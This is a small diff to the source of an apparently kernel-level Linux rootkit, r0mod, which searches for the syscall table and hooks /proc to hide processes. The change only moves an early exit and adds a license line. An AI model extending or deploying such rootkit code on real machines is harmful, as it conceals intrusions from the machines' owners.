@@ -309,6 +309,8 @@ static int __init r0mod_init(void)
     DEBUG("Search Start: %lx\n", SEARCH_START);
     DEBUG("Search End:   %lx\n", SEARCH_END);
 
+    return -1;
+
     #if defined(_CONFIG_X86_64_)
     if((sct = (void *)find_sct()) == NULL)
         DEBUG("sct == NULL * 1\n");
@@ -323,8 +325,6 @@ static int __init r0mod_init(void)
     }
 
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
-
-    return -1;
 
     /* Hook /proc for hiding processes */
     proc_iterate = get_vfs_iterate("/proc");
@@ -363,3 +363,5 @@ static void __exit r0mod_exit(void)
 
 module_init(r0mod_init);
 module_exit(r0mod_exit);
+
+MODULE_LICENSE("GPL");
